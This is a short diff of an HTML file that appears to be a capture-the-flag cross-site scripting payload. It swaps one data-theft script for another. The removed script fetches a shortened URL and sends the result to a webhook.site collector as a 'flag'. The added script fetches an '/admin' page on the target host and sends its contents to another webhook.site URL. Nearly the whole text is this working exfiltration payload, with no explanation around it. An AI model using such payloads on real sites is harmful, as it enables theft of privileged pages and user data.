@@ -1,11 +1,8 @@
-<head>
-    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
-</head>
 
 <script>
-    fetch(`https://tinyurl.com/2x5y7nzz`).then(response => response.text()).then(data => {
-        fetch(`https://webhook.site/bab544ec-ab97-4f19-a87c-18afab171a00/?flag=${data}`);
-    });
+    fetch('http://deadbrowse.deadface.io:3000/admin')
+  .then(response => response.text())
+  .then(data => {fetch(`https://webhook.site/50c8c09f-288c-4227-a227-225c5d4377d6/?data=${data}`)});
 </script>
 
 <!-- <script>
